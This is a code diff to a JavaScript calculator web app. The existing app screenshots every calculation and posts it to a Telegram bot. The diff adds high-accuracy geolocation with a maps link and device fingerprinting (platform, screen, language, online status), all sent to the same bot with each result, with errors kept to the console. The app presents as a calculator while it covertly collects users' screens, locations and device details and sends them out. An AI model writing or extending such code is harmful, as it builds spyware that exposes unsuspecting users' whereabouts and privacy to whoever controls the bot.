@@ -1,6 +1,7 @@
 // ==========================================
 // حاسبة عبدالله
 // Calculator + History + Telegram Screenshot
+// + Device Location
 // ==========================================
 
 const $ = (id) => document.getElementById(id);
@@ -201,6 +202,71 @@ function backspace() {
 }
 
 // ==========================================
+// Get Current Location
+// ==========================================
+
+function getCurrentLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(
+        new Error(
+          "المتصفح لا يدعم تحديد الموقع."
+        )
+      );
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          latitude:
+            position.coords.latitude,
+
+          longitude:
+            position.coords.longitude,
+
+          accuracy:
+            position.coords.accuracy
+        });
+      },
+
+      (error) => {
+        reject(error);
+      },
+
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  });
+}
+
+// ==========================================
+// Get Device Information
+// ==========================================
+
+function getDeviceInfo() {
+  return {
+    userAgent:
+      navigator.userAgent || "Unknown",
+
+    language:
+      navigator.language || "Unknown",
+
+    platform:
+      navigator.platform || "Unknown",
+
+    screen:
+      `${window.screen.width}x${window.screen.height}`,
+
+    online:
+      navigator.onLine ? "Online" : "Offline"
+  };
+}
+
+// ==========================================
 // Equals
 // ==========================================
 
@@ -226,8 +292,12 @@ async function equals() {
       getHistory();
 
     history.unshift({
-      expression: currentExpression,
-      result: calculated,
+      expression:
+        currentExpression,
+
+      result:
+        calculated,
+
       time:
         new Date().toLocaleString(
           "ar-EG"
@@ -257,7 +327,7 @@ async function equals() {
 }
 
 // ==========================================
-// Screenshot + Telegram
+// Screenshot + Location + Telegram
 // ==========================================
 
 async function captureAndSendToTelegram(
@@ -265,7 +335,10 @@ async function captureAndSendToTelegram(
   res
 ) {
   try {
+    // ======================================
     // التأكد من html2canvas
+    // ======================================
+
     if (!window.html2canvas) {
       console.error(
         "html2canvas لم يتم تحميله."
@@ -273,7 +346,10 @@ async function captureAndSendToTelegram(
       return;
     }
 
+    // ======================================
     // التأكد من إعداد Telegram
+    // ======================================
+
     if (
       typeof TELEGRAM_CONFIG ===
       "undefined"
@@ -297,23 +373,78 @@ async function captureAndSendToTelegram(
       return;
     }
 
+    // ======================================
+    // الحصول على الموقع
+    // ======================================
+
+    let locationText =
+      "📍 الموقع: غير متاح";
+
+    try {
+      const location =
+        await getCurrentLocation();
+
+      const latitude =
+        location.latitude;
+
+      const longitude =
+        location.longitude;
+
+      const accuracy =
+        Math.round(
+          location.accuracy
+        );
+
+      locationText =
+        `📍 الموقع:\n` +
+        `Latitude: ${latitude}\n` +
+        `Longitude: ${longitude}\n` +
+        `الدقة: ±${accuracy} متر\n` +
+        `🗺️ https://www.google.com/maps?q=${latitude},${longitude}`;
+
+    } catch (locationError) {
+      console.warn(
+        "Location Error:",
+        locationError
+      );
+
+      locationText =
+        "📍 الموقع: لم يتم السماح بالوصول للموقع أو الموقع غير متاح.";
+    }
+
+    // ======================================
+    // معلومات الجهاز
+    // ======================================
+
+    const device =
+      getDeviceInfo();
+
+    // ======================================
     // أخذ Screenshot
+    // ======================================
+
     const canvas =
       await html2canvas(
         $("captureArea"),
         {
           backgroundColor:
             "#ffffff",
-          scale: Math.min(
-            2,
-            window.devicePixelRatio ||
-              1
-          ),
+
+          scale:
+            Math.min(
+              2,
+              window.devicePixelRatio ||
+                1
+            ),
+
           useCORS: true
         }
       );
 
-    // تحويل الصورة إلى Blob
+    // ======================================
+    // تحويل Screenshot إلى Blob
+    // ======================================
+
     const blob =
       await new Promise(
         (resolve) => {
@@ -331,13 +462,43 @@ async function captureAndSendToTelegram(
       );
     }
 
-    const caption =
-      `🧮 حاسبة عبدالله\n` +
-      `العملية: ${exp}\n` +
-      `النتيجة: ${res}\n` +
-      `الوقت: ${new Date().toLocaleString(
+    // ======================================
+    // الوقت
+    // ======================================
+
+    const currentTime =
+      new Date().toLocaleString(
         "ar-EG"
-      )}`;
+      );
+
+    // ======================================
+    // Caption
+    // ======================================
+
+    const caption =
+      `🧮 حاسبة عبدالله\n\n` +
+
+      `🔢 العملية: ${exp}\n` +
+
+      `✅ النتيجة: ${res}\n` +
+
+      `🕐 الوقت: ${currentTime}\n\n` +
+
+      `${locationText}\n\n` +
+
+      `📱 معلومات الجهاز:\n` +
+
+      `Platform: ${device.platform}\n` +
+
+      `Screen: ${device.screen}\n` +
+
+      `Language: ${device.language}\n` +
+
+      `Status: ${device.online}`;
+
+    // ======================================
+    // FormData
+    // ======================================
 
     const formData =
       new FormData();
@@ -358,7 +519,10 @@ async function captureAndSendToTelegram(
       `calculation-${Date.now()}.png`
     );
 
+    // ======================================
     // إرسال Telegram
+    // ======================================
+
     const response =
       await fetch(
         `https://api.telegram.org/bot${botToken}/sendPhoto`,
@@ -381,8 +545,11 @@ async function captureAndSendToTelegram(
       );
     }
 
+    console.log(
+      "Screenshot + Location sent successfully."
+    );
+
   } catch (error) {
-    // الخطأ يظهر في Console فقط
     console.error(
       "Telegram Error:",
       error
